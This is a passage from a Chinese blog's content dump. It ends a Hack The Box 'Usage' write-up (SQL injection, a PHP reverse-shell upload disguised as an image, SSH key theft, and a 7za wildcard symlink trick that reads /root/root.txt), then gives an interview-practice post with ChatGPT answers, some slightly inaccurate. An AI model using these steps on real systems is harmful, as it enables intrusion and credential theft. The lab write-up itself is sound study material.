class=\"string\">laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D</span></span><br><span class=\"line\"><span class=\"attr\">Connection:</span> <span class=\"string\">close</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&amp;email=a%40a.com</span> <span class=\"comment\"># 注意这里用手注的 payload</span></span><br></pre></td></tr></table></figure>\n\n<p>&lt;这里想起来就补&gt;</p>\n<p>用 john 爆出密码 <code>whatever1</code>，在 <code>admin.usage.htb</code> 登录。<br>发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。<br>传 linpeas.sh 开扫，发现 <code>/home/dash/.ssh/id_rsa</code>，下到本地，登录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 600 dash.pri  <span class=\"comment\"># 不然不给连</span></span><br><span class=\"line\">ssh -i dash.pri dash@10.10.11.18</span><br></pre></td></tr></table></figure>\n\n<p><code>/home/dash</code> 目录下有个 <code>.monitrc</code>，内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Monitoring Interval in Seconds</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> daemon  60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Enable Web Access</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> httpd port 2812</span><br><span class=\"line\">     use address 127.0.0.1</span><br><span class=\"line\">     allow admin:3nc0d3d_pa$<span class=\"variable\">$w0rd</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Apache</span></span><br><span class=\"line\">check process apache with pidfile <span class=\"string\">&quot;/var/run/apache2/apache2.pid&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu &gt; 80% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#System Monitoring</span></span><br><span class=\"line\">check system usage</span><br><span class=\"line\">    <span class=\"keyword\">if</span> memory usage &gt; 80% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu usage (user) &gt; 70% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cpu usage (system) &gt; 30% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu usage (<span class=\"built_in\">wait</span>) &gt; 20% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> loadavg (1min) &gt; 6 <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> loadavg (5min) &gt; 4 <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> swap usage &gt; 5% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\"></span><br><span class=\"line\">check filesystem rootfs with path /</span><br><span class=\"line\">       <span class=\"keyword\">if</span> space usage &gt; 80% <span class=\"keyword\">then</span> alert</span><br></pre></td></tr></table></figure>\n\n<p>这里就藏着 xander 的密码 <code>3nc0d3d_pa$$w0rd</code>（感觉有点脑洞）<br>登录后 <code>sudo -l</code> 看一眼，发现可以 <code>sudo /usr/bin/usage_management</code>，把文件拖下看用 IDA 看一眼</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Choose an option:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Project Backup&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Backup MySQL data&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. Reset admin password&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter your choice (1/2/3): &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    resetAdminPassword();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">LABEL_9:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice.&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      backupWebContent();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_9;</span><br><span class=\"line\">      backupMysqlData();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现 <code>resetAdminPassword</code> 是用来消遣你的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">resetAdminPassword</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Password has been reset.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">backupWebContent</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( chdir(<span class=\"string\">&quot;/var/www/html&quot;</span>) )</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;Error changing working directory to /var/www/html&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    system(<span class=\"string\">&quot;/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">backupMysqlData</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>来分析一下这句命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *</span><br></pre></td></tr></table></figure>\n\n<p><code>7za</code> 是 7zip 的命令行版本，<code>a</code> 是添加文件到压缩包，位置为 <code>/var/backups/project.zip</code>，<code>-tzip</code> 指定压缩格式为 zip，<code>-snl</code> 将符号链接作为链接存储，即不是压缩其指向的内容，<code>-mmt</code> 是多线程压缩，<code>--</code> 结束选项，<code>*</code> 压缩所有文件。<br><a href=\"https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks\">Hacktricks</a> 提到了利用这个的 trick，在 7z 中，<code>@</code> 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 <code>root.txt</code> 当作文件列表，然后尝试对 <code>root.txt</code> 里列出的文件进行压缩</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</span><br><span class=\"line\"><span class=\"built_in\">touch</span> @root.txt</span><br><span class=\"line\"><span class=\"built_in\">ln</span> -s /root/root.txt root.txt</span><br></pre></td></tr></table></figure>\n\n<p>然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。</p>\n<blockquote>\n<p>软链接与硬链接<br>  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。<br>  生成方法上，软链接 <code>ln -s</code>；硬链接 <code>ln</code>，目录则需要 <code>cp -al /path/to/dir /path/to/link</code>。<br>  一般来说，软链接用得多，硬链接用得少。</p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>Two Million<br><a href=\"https://h4r1337.github.io/posts/two-million/\">https://h4r1337.github.io/posts/two-million/</a><br><a href=\"https://blog.csdn.net/song_lee/article/details/131245481\">https://blog.csdn.net/song_lee/article/details/131245481</a><br>Mailing<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/138482768\">https://blog.csdn.net/m0_52742680/article/details/138482768</a><br><a href=\"https://blog.csdn.net/whale_waves/article/details/138896310\">https://blog.csdn.net/whale_waves/article/details/138896310</a><br>BoardLight<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/139233464\">https://blog.csdn.net/m0_52742680/article/details/139233464</a><br><a href=\"https://blog.csdn.net/2201_75526400/article/details/139304432\">https://blog.csdn.net/2201_75526400/article/details/139304432</a><br>Usage<br><a href=\"https://blog.csdn.net/zr1213159840/article/details/124548770\">https://blog.csdn.net/zr1213159840/article/details/124548770</a><br><a href=\"https://amandaguglieri.github.io/hackinglife/htb-usage/\">https://amandaguglieri.github.io/hackinglife/htb-usage/</a></p>"},{"title":"GPT 面试官","date":"2024-06-02T05:54:00.000Z","_content":"\n提前拷打自己。\n\n<!--more-->\n\n## Day 1\n\n* 请描述 `malloc` 和 `free` 的内部工作机制以及可能导致的内存泄漏问题。\n    不会。\n    GPT：`malloc` 是用来在堆上分配内存的函数，它会找到一块足够大的空闲内存块，然后标记为已使用并返回该内存块的指针。`free` 用来释放之前用 `malloc` 分配的内存，它将内存块标记为未使用，以便后续分配。内存泄漏问题是由于程序员忘记释放不再使用的内存，导致可用内存逐渐减少，最终可能耗尽内存资源\n* 在 Python 中，如何处理多线程与多进程？它们之间有何区别？\n    不会。\n    GPT：在 Python 中，多线程可以使用 `threading` 模块，多进程可以使用 `multiprocessing` 模块。多线程适用于 I/O 密集型任务，而多进程适用于 CPU 密集型任务。主要区别在于多线程共享相同的内存空间，线程间通信开销较小，但由于 GIL（全局解释器锁）的存在，无法充分利用多核 CPU。而多进程每个进程有独立的内存空间，能够绕过 GIL，更好地利用多核 CPU，但进程间通信开销较大。\n* 解释一下 Python 中的 GIL（全局解释器锁）是什么，以及它对多线程编程的影响。\n    不会。\n    GIL 是 Python 解释器用来保护访问 Python 对象的全局锁，确保同一时刻只有一个线程执行 Python 字节码。它的存在使得 Python 多线程在 CPU 密集型任务中无法提高执行效率，因为即使在多核处理器上，也只能有一个线程执行 Python 代码。这限制了 Python 在多线程 CPU 密集型任务中的并行执行能力。\n* 在 Golang 中，如何进行并发编程？请举例说明。\n    通过 goroutine。\n    GPT：在 Golang 中，并发编程通过 `goroutine` 实现。`goroutine` 是轻量级线程，通过 `go` 关键字启动。示例代码：\n\n    ```go\n    package main\n\n    import (\n        \"fmt\"\n        \"time\"\n    )\n\n    func say(s string) {\n        for i := 0; i < 5; i++ {\n            time.Sleep(100 * time.Millisecond)\n            fmt.Println(s)\n        }\n    }\n\n    func main() {\n        go say(\"world\")\n        say(\"hello\")\n    }\n    ```\n\n    上述代码中，`say(\"world\")` 通过 `goroutine` 并发执行。\n* 请解释 x86 汇编中栈指针（ESP）和基址指针（EBP）的作用及其在函数调用中的使用。\n    ESP 指向当前栈顶，基址指针指向栈底，函数调用时，把 EBP 压栈，再把 ESP 传到 EBP，ESP 指向新的地址。\n    GPT：ESP（栈指针）指向当前栈顶，EBP（基址指针）通常指向当前栈帧的起始位置。在函数调用时，调用者会把当前的 EBP 压栈保存，随后 ESP 的值赋给 EBP，形成新的栈帧，ESP 指向新栈帧的栈顶。函数返回时，通过恢复 EBP 和 ESP 的值来返回到调用者的栈帧。\n* 请解释 RSA 算法的基本原理，并描述一种常见的 RSA 攻击方式。\n    RSA 的安全假设是基于大整数分解的困难性，原理基于欧拉定理；常见攻击方式有部分私钥泄露攻击，Coppersmith 即可恢复私钥。\n    GPT：RSA 算法基于大整数分解的困难性。它使用两个大质数的乘积作为公钥，公钥加密消息后只能用对应的私钥解密。常见的 RSA 攻击方式包括基于部分私钥泄露的攻击，例如 Coppersmith 攻击，这种攻击可以在已知部分私钥的情况下恢复完整私钥。\n* 如何实现一个安全的随机数生成器？请讨论常见的伪随机数生成器的安全性问题。\n    使其达到 m-序列；常见伪随机数生成器均为线性，已经一部分序列容易恢复全部序列。\n    GPT：安全的随机数生成器通常基于硬件随机数生成器或密码学安全算法，如 CryptGenRandom（Windows）或 /dev/random（Linux）。常见的伪随机数生成器（PRNG）如 rand() 基于线性同余生成器，安全性较差，容易预测，安全性不高。密码学安全的 PRNG（CSPRNG）如 openssl 提供的随机数生成器使用复杂的算法确保不可预测性。\n* 请描述如何使用 IDA Pro 进行静态分析，并解释其在逆向工程中的作用。\n    IDA 的插件可以直接生成 C 的伪代码，可以对其伪代码进行逆向分析。\n    GPT：IDA Pro 是一款强大的反汇编工具，用于将二进制代码转换为可读的汇编代码或伪代码。它可以通过插件生成 C 的伪代码，便于理解程序逻辑。在逆向工程中，IDA Pro 通过静态分析帮助分析二进制文件的结构、函数调用关系和代码流程，从而理解和修改程序。\n* 请举例说明如何利用 GDB 进行动态调试，以及在调试过程中常见的陷阱和解决方法。\n    不会。\n    GDB 是 GNU 的调试器，用于调试 C 和 C++ 程序。常见的使用方法包括：\n\n    ```sh\n    gdb ./program\n    ```\n\n    启动程序并设置断点：\n\n    ```gdb\n    break main\n    run\n    ```\n\n    查看变量值：\n\n    ```gdb\n    print variable\n    ```\n\n    单步执行：\n\n    ```gdb\n    next\n    step\n    ```\n\n    常见陷阱包括多线程调试时难以同步线程、优化编译后的代码难以调试等。解决方法是使用 GDB 提供的线程命令和编译时关闭优化选项。\n* 什么是栈溢出漏洞？请解释如何通过 ROPgadget 工具进行 ROP（返回导向编程）攻击。\n    栈溢出漏洞是指变量在栈上空间分配不足，写入数据越过了变量的栈空间覆盖到其他数据，常见覆盖返回地址，从而劫持程序流；ROPgadget 可以查找程序中存在的 pop 和 ret 指令，通过这些指令可以劫持流。\n    GPT：栈溢出漏洞是指程序将数据写入栈时超过预期长度，覆盖了其他数据，尤其是返回地址，从而劫持程序流。ROPgadget 工具用于查找程序中现有的 `pop` 和 `ret` 指令，通过这些指令片段（gadget）链式组合，实现复杂的恶意行为而不需要插入新代码，从而绕过不可执行栈保护（NX bit）。\n* 请描述堆溢出漏洞的原理，并举例说明如何利用该漏洞进行攻击。\n    不会。\n    GPT：堆溢出漏洞是指程序在堆上分配内存时超过了分配的边界，覆盖了其他内存区域。攻击者可以利用该漏洞修改程序控制数据或函数指针，导致执行任意代码。示例攻击包括利用堆溢出修改函数指针，使其指向恶意代码，从而执行任意命令。\n* 请解释如何使用 Burp Suite 进行 Web 应用程序的漏洞扫描。\n    一般不使用 BP 扫漏洞。\n    Burp Suite 是一款用于 Web 安全测试的综合工具。其漏洞扫描器模块可以自动发现常见的 Web 应用漏洞，如 SQL 注入、跨站脚本（XSS）等。使用方法包括设置代理拦截 HTTP 流量，进行主动或被动扫描，分析结果并生成报告。\n* 在渗透测试中，如何使用 Nmap 进行网络探测？请解释常用的 Nmap 扫描类型及其用途。\n    一般加参数 `-F` 扫常见端口，再 `-p-` 全端口扫描，`-sS` 查看端口上运行的服务详情。\n    GPT：Nmap 是一款网络扫描工具，用于发现网络上的设备和服务。常用扫描类型包括：\n    -sS（SYN 扫描）：快速隐蔽扫描，适用于发现开放端口。\n    -sT（TCP 连接扫描）：完全连接扫描，适用于详细服务信息获取。\n    -sU（UDP 扫描）：扫描 UDP 端口，发现 UDP 服务。\n    -O（操作系统检测）：识别远程主机的操作系统。\n* 请描述你在 Linux 系统中常用的系统管理命令及其功能。\n    `ls` 查看目录下文件，`nano` 编辑文件，`df` 查看磁盘，`pwd` 当前目录。\n    GPT:常用的 Linux 系统管理命令包括：\n    ls：列出目录内容。\n    nano：轻量级文本编辑器。\n    df：显示文件系统的磁盘空间使用情况。\n    pwd：打印当前工作目录。\n* 在 Linux 环境下，如何设置并管理一个 Nginx 服务器？\n    设置在 nginx.conf 里；不太会。\n    GPT：设置和管理 Nginx 服务器包括编辑配置文件 `nginx.conf`，设置服务器块（server blocks）定义虚拟主机，配置反向代理、负载均衡和 SSL。启动、停止和重启 Nginx 服务器使用以下命令：\n\n    ```sh\n    sudo systemctl start nginx\n    sudo systemctl stop nginx\n    sudo systemctl restart nginx\n    ```\n\n* 请解释 GitHub Actions 的工作原理，并描述如何通过 GitHub Actions 实现 CI/CD。\n    通过 .workflow 下设定的工作流实现自动化，可以指定环境，编译代码和发布版本。\n    GPT：GitHub Actions 通过 `.github/workflows` 目录下定义的 YAML 文件配置工作流。每个工作流由触发器、作业和步骤组成。通过配置触发器（如 `push` 或 `pull_request`），指定在特定事件发生时自动执行作业，实现代码的持续集成（CI）和持续部署（CD）。\n* 在使用 Docker 时，如何创建并管理一个多容器应用？请说明 docker-compose 的基本用法。\n    多个容器之间一般会有启动先后的顺序，比如数据库先启动，web 服务后启动，此时通过 `depends_on` 标签控制，持久化部署也需要进行目录映射。\n    Docker Compose 用于定义和管理多容器 Docker 应用。使用 docker-compose.yml 文件定义服务、网络和卷。示例：\n\n    ```yaml\n    version: '3'\n    services:\n    db:\n        image: mysql\n        environment:\n        MYSQL_ROOT_PASSWORD: example\n    web:\n        image: nginx\n        depends_on:\n        - db\n        ports:\n        - \"80:80\"\n    ```\n\n    启动多容器应用：\n\n    ```sh\n    docker-compose up\n    ```\n\n可以看出 GPT 给的答案还是受了我的影响\n","source":"_posts/GPT 面试官.md","raw":"---\ntitle: GPT 面试官\ndate: 2024-06-02 13:54:00\ntags: [GPT, 面试]\ncategories: 学习\n---\n\n提前拷打自己。\n\n<!--more-->\n\n## Day 1\n\n* 请描述 `malloc` 和 `free` 的内部工作机制以及可能导致的内存泄漏问题。\n    不会。\n    GPT：`malloc` 是用来在堆上分配内存的函数，它会找到一块足够大的空闲内存块，然后标记为已使用并返回该内存块的指针。`free` 用来释放之前用 `malloc` 分配的内存，它将内存块标记为未使用，以便后续分配。内存泄漏问题是由于程序员忘记释放不再使用的内存，导致可用内存逐渐减少，最终可能耗尽内存资源\n* 在 Python 中，如何处理多线程与多进程？它们之间有何区别？\n    不会。\n    GPT：在 Python 中，多线程可以使用 `threading` 模块，多进程可以使用 `multiprocessing` 模块。多线程适用于 I/O 密集型任务，而多进程适用于 CPU 密集型任务。主要区别在于多线程共享相同的内存空间，线程间通信开销较小，但由于 GIL（全局解释器锁）的存在，无法充分利用多核 CPU。而多进程每个进程有独立的内存空间，能够绕过 GIL，更好地利用多核 CPU，但进程间通信开销较大。\n* 解释一下 Python 中的 GIL（全局解释器锁）是什么，以及它对多线程编程的影响。\n    不会。\n    GIL 是 Python 解释器用来保护访问 Python 对象的全局锁，确保同一时刻只有一个线程执行 Python 字节码。它的存在使得 Python 多线程在 CPU 密集型任务中无法提高执行效率，因为即使在多核处理器上，也只能有一个线程执行 Python 代码。这限制了 Python 在多线程 CPU 密集型任务中的并行执行能力。\n* 在 Golang 中，如何进行并发编程？请举例说明。\n    通过 goroutine。\n    GPT：在 Golang 中，并发编程通过 `goroutine` 实现。`goroutine` 是轻量级线程，通过 `go` 关键字启动。示例代码：\n\n    ```go\n    package main\n\n    import (\n        \"fmt\"\n        \"time\"\n    )\n\n    func say(s string) {\n        for i := 0; i < 5; i++ {\n            time.Sleep(100 * time.Millisecond)\n            fmt.Println(s)\n        }\n    }\n\n    func main() {\n        go say(\"world\")\n        say(\"hello\")\n    }\n    ```\n\n    上述代码中，`say(\"world\")` 通过 `goroutine` 并发执行。\n* 请解释 x86 汇编中栈指针（ESP）和基址指针（EBP）的作用及其在函数调用中的使用。\n    ESP 指向当前栈顶，基址指针指向栈底，函数调用时，把 EBP 压栈，再把 ESP 传到 EBP，ESP 指向新的地址。\n    GPT：ESP（栈指针）指向当前栈顶，EBP（基址指针）通常指向当前栈帧的起始位置。在函数调用时，调用者会把当前的 EBP 压栈保存，随后 ESP 的值赋给 EBP，形成新的栈帧，ESP 指向新栈帧的栈顶。函数返回时，通过恢复 EBP 和 ESP 的值来返回到调用者的栈帧。\n* 请解释 RSA 算法的基本原理，并描述一种常见的 RSA 攻击方式。\n    RSA 的安全假设是基于大整数分解的困难性，原理基于欧拉定理；常见攻击方式有部分私钥泄露攻击，Coppersmith 即可恢复私钥。\n    GPT：RSA 算法基于大整数分解的困难性。它使用两个大质数的乘积作为公钥，公钥加密消息后只能用对应的私钥解密。常见的 RSA 攻击方式包括基于部分私钥泄露的攻击，例如 Coppersmith 攻击，这种攻击可以在已知部分私钥的情况下恢复完整私钥。\n* 如何实现一个安全的随机数生成器？请讨论常见的伪随机数生成器的安全性问题。\n    使其达到 m-序列；常见伪随机数生成器均为线性，已经一部分序列容易恢复全部序列。\n    GPT：安全的随机数生成器通常基于硬件随机数生成器或密码学安全算法，如 CryptGenRandom（Windows）或 /dev/random（Linux）。常见的伪随机数生成器（PRNG）如 rand() 基于线性同余生成器，安全性较差，容易预测，安全性不高。密码学安全的 PRNG（CSPRNG）如 openssl 提供的随机数生成器使用复杂的算法确保不可预测性。\n* 请描述如何使用 IDA Pro 进行静态分析，并解释其在逆向工程中的作用。\n    IDA 的插件可以直接生成 C 的伪代码，可以对其伪代码进行逆向分析。\n    GPT：IDA Pro 是一款强大的反汇编工具，用于将二进制代码转换为可读的汇编代码或伪代码。它可以通过插件生成 C 的伪代码，便于理解程序逻辑。在逆向工程中，IDA Pro 通过静态分析帮助分析二进制文件的结构、函数调用关系和代码流程，从而理解和修改程序。\n* 请举例说明如何利用 GDB 进行动态调试，以及在调试过程中常见的陷阱和解决方法。\n    不会。\n    GDB 是 GNU 的调试器，用于调试 C 和 C++ 程序。常见的使用方法包括：\n\n    ```sh\n    gdb ./program\n    ```\n\n    启动程序并设置断点：\n\n    ```gdb\n    break main\n    run\n    ```\n\n    查看变量值：\n\n    ```gdb\n    print variable\n    ```\n\n    单步执行：\n\n    ```gdb\n    next\n    step\n    ```\n\n    常见陷阱包括多线程调试时难以同步线程、优化编译后的代码难以调试等。解决方法是使用 GDB 提供的线程命令和编译时关闭优化选项。\n* 什么是栈溢出漏洞？请解释如何通过 ROPgadget 工具进行 ROP（返回导向编程）攻击。\n    栈溢出漏洞是指变量在栈上空间分配不足，写入数据越过了变量的栈空间覆盖到其他数据，常见覆盖返回地址，从而劫持程序流；ROPgadget 可以查找程序中存在的 pop 和 ret 指令，通过这些指令可以劫持流。\n    GPT：栈溢出漏洞是指程序将数据写入栈时超过预期长度，覆盖了其他数据，尤其是返回地址，从而劫持程序流。ROPgadget 工具用于查找程序中现有的 `pop` 和 `ret` 指令，通过这些指令片段（gadget）链式组合，实现复杂的恶意行为而不需要插入新代码，从而绕过不可执行栈保护（NX bit）。\n* 请描述堆溢出漏洞的原理，并举例说明如何利用该漏洞进行攻击。\n    不会。\n    GPT：堆溢出漏洞是指程序在堆上分配内存时超过了分配的边界，覆盖了其他内存区域。攻击者可以利用该漏洞修改程序控制数据或函数指针，导致执行任意代码。示例攻击包括利用堆溢出修改函数指针，使其指向恶意代码，从而执行任意命令。\n* 请解释如何使用 Burp Suite 进行 Web 应用程序的漏洞扫描。\n    一般不使用 BP 扫漏洞。\n    Burp Suite 是一款用于 Web 安全测试的综合工具。其漏洞扫描器模块可以自动发现常见的 Web 应用漏洞，如 SQL 注入、跨站脚本（XSS）等。使用方法包括设置代理拦截 HTTP 流量，进行主动或被动扫描，分析结果并生成报告。\n* 在渗透测试中，如何使用 Nmap 进行网络探测？请解释常用的 Nmap 扫描类型及其用途。\n    一般加参数 `-F` 扫常见端口，再 `-p-` 全端口扫描，`-sS` 查看端口上运行的服务详情。\n    GPT：Nmap 是一款网络扫描工具，用于发现网络上的设备和服务。常用扫描类型包括：\n    -sS（SYN 扫描）：快速隐蔽扫描，适用于发现开放端口。\n    -sT（TCP 连接扫描）：完全连接扫描，适用于详细服务信息获取。\n    -sU（UDP 扫描）：扫描 UDP 端口，发现 UDP 服务。\n    -O（操作系统检测）：识别远程主机的操作系统。\n* 请描述你在 Linux 系统中常用的系统管理命令及其功能。\n    `ls` 查看目录下文件，`nano` 编辑文件，`df` 查看磁盘，`pwd` 当前目录。\n    GPT:常用的 Linux 系统管理命令包括：\n    ls：列出目录内容。\n    nano：轻量级文本编辑器。\n    df：显示文件系统的磁盘空间使用情况。\n    pwd：打印当前工作目录。\n* 在 Linux 环境下，如何设置并管理一个 Nginx 服务器？\n    设置在 nginx.conf 里；不太会。\n    GPT：设置和管理 Nginx 服务器包括编辑配置文件 `nginx.conf`，设置服务器块（server blocks）定义虚拟主机，配置反向代理、负载均衡和 SSL。启动、停止和重启 Nginx 服务器使用以下命令：\n\n    ```sh\n    sudo systemctl start nginx\n    sudo systemctl stop nginx\n    sudo systemctl restart nginx\n    ```\n\n* 请解释 GitHub Actions 的工作原理，并描述如何通过 GitHub Actions 实现 CI/CD。\n    通过 .workflow 下设定的工作流实现自动化，可以指定环境，编译代码和发布版本。\n    GPT：GitHub Actions 通过 